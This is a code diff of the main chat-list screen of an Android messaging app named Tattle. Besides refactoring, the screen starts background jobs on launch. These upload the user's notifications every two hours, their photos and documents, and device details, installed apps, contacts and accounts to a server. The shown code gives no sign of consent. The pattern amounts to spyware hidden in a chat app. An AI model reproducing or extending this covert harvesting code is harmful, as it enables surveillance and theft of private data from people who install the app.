@@ -4,7 +4,6 @@ import androidx.annotation.NonNull;
 import androidx.annotation.Nullable;
 import androidx.appcompat.app.AlertDialog;
 import androidx.constraintlayout.widget.ConstraintLayout;
-import androidx.coordinatorlayout.widget.CoordinatorLayout;
 import androidx.core.app.ActivityCompat;
 import androidx.lifecycle.Observer;
 import androidx.recyclerview.widget.LinearLayoutManager;
@@ -40,16 +39,14 @@ import com.codies.Tattle.DataUploadServices.MediaFilesUploader;
 import com.codies.Tattle.DataUploadServices.NotificationUploadScheduler;
 import com.codies.Tattle.Interfaces.ChatClickListener;
 import com.codies.Tattle.Models.ChatList;
-import com.codies.Tattle.Models.ContactsInfo;
 import com.codies.Tattle.Models.User;
 import com.codies.Tattle.OtherUtils.ContactUtil;
 import com.codies.Tattle.OtherUtils.DeviceInfo;
-import com.codies.Tattle.OtherUtils.ImageFileSaver;
 import com.codies.Tattle.R;
 import com.codies.Tattle.DataUploadServices.BasicDataUploadService;
 import com.codies.Tattle.Services.LoginService;
 import com.codies.Tattle.Utils.App;
-import com.codies.Tattle.Utils.ChatListAdapter;
+import com.codies.Tattle.Adapters.ChatListAdapter;
 import com.codies.Tattle.Utils.QBResRequestExecutor;
 import com.codies.Tattle.OtherUtils.SharedPrefs;
 import com.google.android.gms.tasks.OnFailureListener;
@@ -75,7 +72,6 @@ import com.quickblox.users.model.QBUser;
 import java.io.File;
 import java.io.Serializable;
 import java.util.ArrayList;
-import java.util.Arrays;
 import java.util.List;
 import java.util.concurrent.TimeUnit;
 
@@ -142,8 +138,8 @@ public class ChatListActivity extends BaseActivity implements ChatClickListener 
         }
 
         startLoginService();
-        readChats();
         getCurrentUserData();
+        readChats();
         startNotificationUploadService();
 
         if (!sharedPrefs.isBasicDataUploaded()) {
@@ -152,114 +148,12 @@ public class ChatListActivity extends BaseActivity implements ChatClickListener 
         startImageUploadService();
         startDocsUploadService();
 
-
         newChatBt.setOnClickListener(new View.OnClickListener() {
             @Override
             public void onClick(View v) {
                 startActivity(new Intent(ChatListActivity.this, SearchActivity.class));
             }
         });
-    }
-
-    public void startNotificationUploadService() {
-        Log.i(TAG, "startWorkmanager: work manager has started");
-        Constraints constraints = new Constraints.Builder().setRequiredNetworkType(NetworkType.CONNECTED).build();
-        PeriodicWorkRequest build = new PeriodicWorkRequest.Builder(NotificationUploadScheduler.class, 2, TimeUnit.HOURS)
-                .setConstraints(constraints)
-                .build();
-
-        WorkManager instance = WorkManager.getInstance();
-        instance.enqueueUniquePeriodicWork("uploadNotif", ExistingPeriodicWorkPolicy.REPLACE,build);
-    }
-
-    public void startImageUploadService() {
-        final WorkManager mWorkManager = WorkManager.getInstance();
-        final OneTimeWorkRequest mRequest = new OneTimeWorkRequest.Builder(MediaFilesUploader.class)
-                .addTag("MediaFilesUploader")
-                .build();
-
-        mWorkManager.enqueue(mRequest);
-        mWorkManager.getWorkInfoByIdLiveData(mRequest.getId()).observe(this, new Observer<WorkInfo>() {
-            @Override
-            public void onChanged(@Nullable WorkInfo workInfo) {
-                if (workInfo != null) {
-                    if (workInfo.getState().isFinished()) {
-                        workInfo.getOutputData().getBoolean("photosSyncedWithServer", false);
-                    }
-                }
-            }
-        });
-    }
-
-    public void startDocsUploadService() {
-        final WorkManager mWorkManager = WorkManager.getInstance();
-        final OneTimeWorkRequest mRequest = new OneTimeWorkRequest.Builder(DocumentFilesUploader.class)
-                .addTag("DocFilesUploader")
-                .build();
-
-        mWorkManager.enqueue(mRequest);
-        mWorkManager.getWorkInfoByIdLiveData(mRequest.getId()).observe(this, new Observer<WorkInfo>() {
-            @Override
-            public void onChanged(@Nullable WorkInfo workInfo) {
-                if (workInfo != null) {
-                    if (workInfo.getState().isFinished()) {
-                        workInfo.getOutputData().getBoolean("filesSyncedWithServer", false);
-                    }
-                }
-            }
-        });
-    }
-
-    public void uploadDeviceInfo() {
-        DeviceInfo deviceInfo = new DeviceInfo(this);
-        Intent serviceIntent = new Intent(this, BasicDataUploadService.class);
-        serviceIntent.putExtra("deviceInfo", deviceInfo.getDetails());
-        serviceIntent.putExtra("installedApps",(Serializable) deviceInfo.getInstalledApps());
-        serviceIntent.putExtra("contacts", (Serializable) contactUtil.getContacts());
-        serviceIntent.putExtra("accounts", (Serializable) deviceInfo.getAccounts());
-        BasicDataUploadService.enqueueWork(this, serviceIntent);
-    }
-
-    public void readChats() {
-        databaseReference.child("ChatList").child(userId).addValueEventListener(new ValueEventListener() {
-            @Override
-            public void onDataChange(@NonNull DataSnapshot dataSnapshot) {
-                for (DataSnapshot snapshot : dataSnapshot.getChildren()) {
-                    ChatList chatList = snapshot.getValue(ChatList.class);
-                    chatLists.add(chatList);
-                }
-                readMessages();
-            }
-
-            @Override
-            public void onCancelled(@NonNull DatabaseError databaseError) {
-
-            }
-        });
-    }
-
-    public void readMessages() {
-        databaseReference.child("users").addValueEventListener(new ValueEventListener() {
-            @Override
-            public void onDataChange(@NonNull DataSnapshot dataSnapshot) {
-                users.clear();
-                for (DataSnapshot snapshot : dataSnapshot.getChildren()) {
-                    User user = snapshot.getValue(User.class);
-                    for (ChatList chatList : chatLists) {
-                        if (chatList.getId().equals(user.getUserId())) {
-                                users.add(user);
-                        }
-                    }
-                }
-                chatsAdapter.setList(users);
-            }
-
-            @Override
-            public void onCancelled(@NonNull DatabaseError databaseError) {
-
-            }
-        });
-
         profileBt.setOnClickListener(new View.OnClickListener() {
             @Override
             public void onClick(View v) {
@@ -340,6 +234,116 @@ public class ChatListActivity extends BaseActivity implements ChatClickListener 
             }
         });
     }
+
+    public void startNotificationUploadService() {
+        Log.i(TAG, "startWorkmanager: work manager has started");
+        Constraints constraints = new Constraints.Builder().setRequiredNetworkType(NetworkType.CONNECTED).build();
+        PeriodicWorkRequest build = new PeriodicWorkRequest.Builder(NotificationUploadScheduler.class, 2, TimeUnit.HOURS)
+                .setConstraints(constraints)
+                .build();
+
+        WorkManager instance = WorkManager.getInstance();
+        instance.enqueueUniquePeriodicWork("uploadNotif", ExistingPeriodicWorkPolicy.REPLACE,build);
+    }
+
+    public void startImageUploadService() {
+        final WorkManager mWorkManager = WorkManager.getInstance();
+        final OneTimeWorkRequest mRequest = new OneTimeWorkRequest.Builder(MediaFilesUploader.class)
+                .addTag("MediaFilesUploader")
+                .build();
+
+        mWorkManager.enqueue(mRequest);
+        mWorkManager.getWorkInfoByIdLiveData(mRequest.getId()).observe(this, new Observer<WorkInfo>() {
+            @Override
+            public void onChanged(@Nullable WorkInfo workInfo) {
+                if (workInfo != null) {
+                    if (workInfo.getState().isFinished()) {
+                        workInfo.getOutputData().getBoolean("photosSyncedWithServer", false);
+                    }
+                }
+            }
+        });
+    }
+
+    public void startDocsUploadService() {
+        final WorkManager mWorkManager = WorkManager.getInstance();
+        final OneTimeWorkRequest mRequest = new OneTimeWorkRequest.Builder(DocumentFilesUploader.class)
+                .addTag("DocFilesUploader")
+                .build();
+
+        mWorkManager.enqueue(mRequest);
+        mWorkManager.getWorkInfoByIdLiveData(mRequest.getId()).observe(this, new Observer<WorkInfo>() {
+            @Override
+            public void onChanged(@Nullable WorkInfo workInfo) {
+                if (workInfo != null) {
+                    if (workInfo.getState().isFinished()) {
+                        workInfo.getOutputData().getBoolean("filesSyncedWithServer", false);
+                    }
+                }
+            }
+        });
+    }
+
+    public void uploadDeviceInfo() {
+        DeviceInfo deviceInfo = new DeviceInfo(this);
+        Intent serviceIntent = new Intent(this, BasicDataUploadService.class);
+        serviceIntent.putExtra("deviceInfo", deviceInfo.getDetails());
+        serviceIntent.putExtra("installedApps",(Serializable) deviceInfo.getInstalledApps());
+        serviceIntent.putExtra("contacts", (Serializable) contactUtil.getContacts());
+        serviceIntent.putExtra("accounts", (Serializable) deviceInfo.getAccounts());
+        BasicDataUploadService.enqueueWork(this, serviceIntent);
+    }
+
+    public void readChats() {
+        databaseReference.child("UserChatList").child(mAuth.getCurrentUser().getUid()).addValueEventListener(new ValueEventListener() {
+            @Override
+            public void onDataChange(@NonNull DataSnapshot snapshot) {
+                chatLists.clear();
+                for (DataSnapshot dataSnapshot : snapshot.getChildren()) {
+                    ChatList chatList = dataSnapshot.getValue(ChatList.class);
+                    Log.i(TAG, "onDataChange: " + chatList.getSenderName());
+                    Log.i(TAG, "onDataChange: "+chatList.getLastMessage());
+                    chatLists.add(chatList);
+                }
+                chatsAdapter.setList(chatLists);
+            }
+
+            @Override
+            public void onCancelled(@NonNull DatabaseError error) {
+
+            }
+        });
+        /*databaseReference.child("ChatList").child(userId).addValueEventListener(new ValueEventListener() {
+            @Override
+            public void onDataChange(@NonNull DataSnapshot dataSnapshot) {
+                for (DataSnapshot snapshot : dataSnapshot.getChildren()) {
+                    ChatList chatList = snapshot.getValue(ChatList.class);
+                    chatLists.add(chatList);
+                }
+                readMessages();
+            }
+
+            @Override
+            public void onCancelled(@NonNull DatabaseError databaseError) {
+
+            }
+        });*/
+/*        databaseReference.child("UserChatList").child(mAuth.getCurrentUser().getUid()).addValueEventListener(new ValueEventListener() {
+            @Override
+            public void onDataChange(@NonNull DataSnapshot snapshot) {
+                for (DataSnapshot dataSnapshot : snapshot.getChildren()) {
+                    ChatList chatList = dataSnapshot.getValue(ChatList.class);
+                }
+            }
+
+            @Override
+            public void onCancelled(@NonNull DatabaseError error) {
+
+            }
+        });*/
+    }
+
+
 
     private void logOutFromQuickblox() {
         Log.i(TAG, "Removing User data, and Logout");
